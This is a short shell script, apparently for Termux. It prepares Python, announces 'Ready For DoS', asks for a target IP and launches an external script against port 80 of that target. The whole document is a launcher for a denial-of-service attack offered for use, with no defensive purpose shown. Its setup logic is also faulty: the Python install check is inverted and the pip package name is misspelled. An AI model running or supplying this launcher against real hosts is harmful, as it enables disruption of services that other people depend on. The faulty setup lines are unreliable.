printf "Updating Termux!\n"
pkg update && pkg upgrade && [[ -n $(command -v python3) ]] && pkg install python3
python3 -m pip install request
sleep 3
clear
printf "\nReady For DoS"
read -p $"Target IP: " ip

run(){
    python "lopyuall.py" -s $1 -p "80"
}

run $ip
